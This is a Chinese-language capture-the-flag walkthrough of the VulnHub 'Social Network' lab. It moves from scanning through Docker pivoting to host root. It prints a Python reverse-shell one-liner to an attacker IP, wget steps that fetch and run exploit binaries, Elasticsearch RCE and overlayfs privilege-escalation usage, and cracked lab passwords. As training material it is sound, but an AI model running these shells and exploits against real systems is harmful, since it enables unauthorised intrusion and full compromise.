>**Name:** BoredHackerBlog: Social Network
>
>**Date release:** 29 Mar 2020
>
>**Author**: [BoredHackerBlog](https://www.vulnhub.com/author/boredhackerblog,683/)
>
>**Series**: [BoredHackerBlog](https://www.vulnhub.com/series/boredhackerblog,295/)
>
>**Download：**[https://www.vulnhub.com/entry/boredhackerblog-social-network,454/](https://www.notion.so/01-1369b9060f3143efa7d241a715127a8c)
>
>**Description:**
>
>Leave a message is a new anonymous social networking site where users can post messages for each other. They've assigned you to test their set up. They do utilize docker containers. You can conduct attacks against those too. Try to see if you can get root on the host though.
>
>**Difficulty:** Med
>
>**Tasks involved:**
>
>- port scanning
>- webapp attacks
>- code injection
>- pivoting
>- exploitation
>- password cracking
>- brute forcing
>
>**Virtual Machine:**
>
>- Format: Virtual Machine (Virtualbox OVA)
>- Operating System: Linux
>
>**Networking:**
>
>- DHCP Service: Enabled
>- IP Address Automatically assign
>
>This works better with VirtualBox rather than VMware.
>
>



## 一、信息收集

### 1.主机发现

```
ip a  #查看kali攻击机IP
```

![image-20210918102335376](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102335376.png)

Kali攻击机的IP地址为10.0.2.4

由于在局域网内搭建的靶场环境，即攻击机与目标机处于同一网段，所以在主机发现环节首选使用二层地址发现方式

```
sudo arp-scan -l #扫描当前局域网内存活主机
```

![image-20210918102447136](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102447136.png)

扫描到了4个IP，其中前三个都是虚拟机中自有的IP，

故目标靶机的IP地址为10.0.2.5

### 2.端口扫描

```
sudo nmap -p- 10.0.2.5            
```

![image-20210918102616054](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102616054.png)

结果显示目标靶机上开放了22,5000端口

### 3.端口服务信息扫描

```
sudo nmap -p22,5000 -sV 10.0.2.5
```

![image-20210918102738150](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102738150.png)

结果显示

22端口开放的SSH服务 版本为6.6 操作系统为Ubuntu

5000端口开放的http服务 获取到的信息为 Werkzeug httpd 0.14.1 (Python 2.7.15) 即这是基于Python2.7开发的Web底层框架，由此可以想到，如果在后面的渗透过程中若**存在代码执行的漏洞**的话可以利用**Python2脚本执行代码**来**反弹shell**

### 4.访问http://10.0.2.5的5000端口

既然是5000端口开放的Web服务，则可使用浏览器访问查看是否有**默认页面**或**目录切入点**

```
访问：http://10.0.2.5:5000  
```

页面如图

![image-20210918102858614](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918102858614.png)

### 5.简单的漏洞测试

尝试对表单提交**测试页面**是否存在SQL注入、XSS等，没有直接相关漏洞的反馈

![image-20210918103046066](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103046066.png)

### 6.目录扫描

对**目录路径**进行发现（**隐藏路径/页面**）

```
dirsearch -u http://10.0.2.5:5000
```

![image-20210918103746798](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103746798.png)

结果显示得到**/admin**路径

### 7.发现远程代码执行漏洞页面

浏览器访问：http://10.0.2.5:5000/admin     页面如图

![image-20210918103832110](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918103832110.png)

该页面提示**“Code testing page” “Nothing was ran. Input some code to exec()”**

可联想到是否可以利用**Python**语言运行环境的**代码执行**触发**反弹shell**

#### 7.1监听4444端口

在攻击机Kali上**监听端口**4444

```
nc -nvlp 4444
```

![image-20211009143219519](https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009143219519.png)

#### 7.2执行Python脚本

在浏览器端的页面内执行Python脚本

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![image-20210918104035254](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104035254.png)

#### 7.3反弹shell成功连接

打开kali监听端，可看到已经**成功连接**，并执行**ls**查看当前目录下**文件信息**，**id**查看当前**用户权限**

```
ls
```

```
id
```

![image-20210918104101495](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104101495.png)

#### 7.4确认权限环境

发现了已经拿到了**root用户权限**，但是又看到目录下存在文件Dockerfile（是Docker标准化部署的模板文件），不由得**怀疑当前取得root权限的系统是一个Docker容器的系统**？不如查看一下该文件

（疑点验证1）

```
cat Dockerfile
```

![image-20210918104242974](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104242974.png)

看到文件内容**加深了怀疑**，当前系统是否运行在一个docker环境内

采用两种方式**判断**是否工作在docker环境：

判断根目录下.dockerenv 文件

（疑点验证2）

```
ls /.dockerenv
```

![image-20210918104335706](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104335706.png)

结果显示存在根目录下的.dockerenv 文件

查询系统进程的cgroup信息

（疑点验证3）

```
cat /proc/1/cgroup
```

![image-20210918104409653](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104409653.png)

结合上面的三次验证结果，可以完全**确认此系统工作在Docker环境内**。

在此处思考：可以**把Docker容器环境所处的网段看作一个内网环境，那么这个内网环境内是否存在其他存活主机呢？**

**若存在其他主机**，就有可能可以得到**更多的信息**，从信息内或许可以**发现漏洞**，进行**利用**，尝试**提权**等。

## 二、内网渗透

### 1.主机发现

对内网网段存活主机进行探测

```
for i in $(seq 1 5);do ping -c 1 172.17.0.$i;done
```

利用for循环定义一个变量i，seq生成一个序列，对网段内每一个IP发1个ping包，**若存活则会返回包**。

![image-20210918104947534](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918104947534.png)

结果显示共有三个回包——**三个存活主机172.17.0.1 ,172.17.0.2 ,172.17.0.3**

```
ip a
```

![image-20210918105041952](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105041952.png)

查看当前IP为172.17.0.3，**故该网段存活主机为172.17.0.1 172.17.0.2**

思考：获取到两个存活主机地址，自然而然就要扫描两台主机上开放的端口和服务等信息，但由于该IP属于内网网段，Kali攻击**道路不通**，所以现在的当务之急就是将**内网穿透**，即**Kali与172.17.0.1 172.17.0.2互通**。

### 2.内网隧道建立

#### 2.1确认内核信息

```
uname -a 
```

![image-20210918105132374](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105132374.png)

获取到该系统内核信息为：**Linux** 2f55c536515d 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_**64** **Linux**

#### 2.2工具选择（Venom）

使用工具Venom

将Venom的对应目标系统的**客户端程序**拷贝到目标系统上（agent）

再通过攻击机kali上的**服务器端程序**(admin)

在二者之间**建立一条隧道**

故Venom客户端程序选择为：**admin_linux_x64，agent_linux_x64**

![image-20210918105515907](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918105515907.png)

#### 2.3上传工具

攻击机Kali内Venom v1.1.0文件夹内打开终端窗口

```
ls
```

```
./admin_linux_x64 -lport 9999    #启动服务端程序 并在本地侦听9999端口，等待客户端（目标容器系统）和kali建立反弹连接
```

![image-20210918110456551](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110456551.png)

如何将**agent_linux_x64**拷贝到**客户端**（目标容器系统）？

在**Kali本地的Venom文件夹内打开HTTP服务**

```
python3 -m http.server 80
```

![image-20210918110518309](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110518309.png)

再使用**客户端**（目标容器系统）**访问Kali来下载**agent_linux_x64

```
wget http://10.0.2.4/agent_linux_x64
```

```
ls
```

并赋予agent_linux_x64可执行权限

```
chmod +x agent_linux_x64
```

![image-20210918110710067](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110710067.png)

启动客户端程序，与Kali建立连接

```
./agent_linux_x64 -rhost 10.0.2.4 -rport 9999
```

![image-20210918110830474](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110830474.png)

服务器端也接收到了客户端的连接请求

#### 2.4建立连接

```
show #显示已连接成功的节点
```

```
goto 1 #连接当前该节点
```

![image-20210918110902587](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918110902587.png)

```
socks 1080
```

启动socks监听1080端口，建立一条**代理通道**，让kali能够通过代理去**正常访问**目标容器系统**内网网段**，方便使用kali上的各类工具

![image-20210918111109130](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111109130.png)

利用proxychains**建立代理**

在Kali端 修改配置文件

```
sudo vi /etc/proxychains4.conf 
```

![image-20210918111302194](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111302194.png)

对应上一步设置的socks5代理和端口，将其修改匹配

![image-20210918111415145](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111415145.png)



**代理通道建立成功**后就可以开始对内网的172.17.0.1和172.17.0.2进行扫描

### 3.针对内网主机端口扫描

#### 3.1针对172.17.0.1扫描

先对172.17.0.1进行端口扫描

```
proxychains nmap -Pn -sT 172.17.0.1
```

![image-20210918111604295](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918111604295.png)

进一步扫描端口服务信息

```
proxychains nmap -p22,5000 -sV 172.17.0.1
```

![image-20210918111650164](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111650164.png)

发现也开放了22和5000端口，**似曾相识**，且服务信息好像也与最开始对靶机10.0.2.5扫描的**结果相同**。

通过浏览器访问一下172.17.0.1，给浏览器配置代理

![image-20210918111815559](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111815559.png)

```
访问：http://172.17.0.1:5000
```

![image-20210918111845987](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111845987.png)

发现页面与之前访问10.0.2.5:5000端口的页面一致，且之前在10.0.2.5**测试的痕迹**也**完全相同**保留在这个页面

判断说明172.17.0.1是10.0.2.5面向容器内的主机

#### 3.2针对172.17.0.2扫描

再对172.17.0.2进行端口扫描

```
proxychains nmap -Pn -sT  172.17.0.2
```

![image-20210918111955790](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918111955790.png)

结果为9200端口开放，进一步扫描端口服务信息

```
proxychains nmap -p9200 -sV 172.17.0.2
```

![image-20210918112034101](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112034101.png)

发现是9200端口上是Elasticsearch服务，且版本是1.4.2

### 4.Elasticsearch漏洞利用

Elasticsearch在历史版本上曾出现过几次验证漏洞，有**RCE远程代码执行漏洞**。

所以我们尝试在kali上搜索有没有Elasticsearch相关**exp**

```
searchsploit Elasticsearch
```

![image-20210918112136386](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112136386.png)

发现两个RCE远程代码执行漏洞，我们先尝试第一个。

将脚本**拷贝**至当前目录

```
cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
```

![image-20210918112328098](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112328098.png)

查看脚本代码

```
vi 36337.py
```

![image-20210918112617712](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918112617712.png)

简单查看该脚本后发现该脚本使用**python2**编写的。（认真看也看不懂-.-）

执行脚本

```
proxychains python2 36337.py 172.17.0.2
```

注意：这里可能会出现执行失败的可能，只需要插入一条数据后，即可成功执行，若失败可参考链接http://www.hackdig.com/05/hack-88907.htm

![image-20210918113310676](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113310676.png)

```
id
```

成功**获取**到该容器系统的**root权限**

### 5.获取root权限后的发现

#### 5.1发现密码文件

```
ls
```

![image-20210918113616491](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113616491.png)

发现passwords文件，是否可能存在密码？

查看passwords文件

```
cat passwords
```

![image-20210918113740971](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918113740971.png)

发现的确是**存放账号密码**的文件

john:3f8184a7343664553fcb5337a3138814 
test:861f194e9d6118f3d942a72be3e51749
admin:670c3bbc209a18dde5446e5e6c1f1d5b
root:b3d34352fc26117979deabdf1b9b6354
jane:5c158b60ed97c723b673529b8a3cf72b

但密码被加密，尝试破解

![image-20210918114022331](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114022331.png)

最终破解得到的**明文密码**如下：

john:1337hack
test:1234test
admin:1111pass
root:1234pass
jane:1234jane

#### 5.2密码利用

那么该如何利用这些账号密码呢？寻找开放了22端口的IP地址（10.0.2.5）使用**ssh连接**

最终发现只有john是可以成功登陆利用的账号

```
ssh john@10.0.2.5
```

![image-20210918114835254](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114835254.png)

成功登陆，查看当前用户权限

```
id
```

![image-20210918114914900](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918114914900.png)

当前为普通用户

#### 5.3漏洞发现

尝试有没有**sudo提权漏洞**

```
sudo -s
```

利用本地提权，结合之前得到的信息该靶机**内核Linux 3.13**，那么这样的老版本是否可能存在**内核漏洞**？

```
searchsploit linux 3.13
```

![image-20210918115843764](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115843764.png)

选取一个exp

拷贝到本地

```
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
```

![image-20210918115933320](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115933320.png)

查看文件

```
vi 37292.c
```

![image-20210918120006327](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120006327.png)

从代码中可以看到，要执行它的话，先要用**gcc编译后**才可执行

在靶机端**查看是否存在gcc**

```
gcc
```

![image-20210918115700764](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918115700764.png)

没有gcc

所以是否可以在Kali本机上**先对其进行编译**

分析代码

![image-20210918120844859](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918120844859.png)

定义了变量lib，变量调用system函数来执行系统命令，命令中再次**调用了gcc**，去查找到另外一个C语言库文件ofs-lib.c，把该库文件再**编译成**对应的**ofs-lib.so**文件（二进制共享库文件），**且在整个代码过程中，会加载调用编译后的ofs-lib.so.so文件**

得到：即使在Kali端使用gcc编译该文件，上传到目标靶机上执行时，执行过程仍然会调用gcc编译后的**ofs-lib.so.so**文件，**仍然会报错**。

解决办法：修改源代码，**删除调用库文件的代码**

![image-20210918121534221](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121534221.png)

最终代码如下：

![image-20210918121641513](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121641513.png)

#### 5.4漏洞利用

gcc编译

```
gcc -o exp 37292.c
```

![image-20210918121714255](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121714255.png)

编译过程中报错，但**不影响最终执行结果**

查看编译生成的exp

```
ls -l
```

![image-20210918121816991](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918121816991.png)

配合exp执行使用还需要二进制的库文件**ofs-lib.so**，定位查找该文件路径

```
locate ofs-lib.so
```

![image-20210918122041377](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122041377.png)

拷贝至当前目录

```
cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
```

```
ls
```

![image-20210918122314167](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122314167.png)

两个文件都在当前目录下

准备将其一并被下载到目标宿主机上，启动http服务

```
python3 -m http.server 80
```

![image-20210918122427173](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122427173.png)

下载文件

```
wget http://10.0.2.4/exp
```

```
wget http://10.0.2.4/ofs-lib.so
```

![image-20210918122710747](https://gitee.com/byesec/picture/raw/master//target/Week1-1//image-20210918122710747.png)

拷贝到目标靶机的/tmp目录下

```
mv * /tmp
```

```
cd /tmp
```

```
ls
```

![image-20210918122819165](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918122819165.png)

赋予exp执行权限

```
chmod +x exp
```

执行脚本

```
./exp
```

![image-20210918123014190](https://gitee.com/byesec/picture/raw/master//target/Week1//image-20210918123014190.png)

成功获取目标root权限

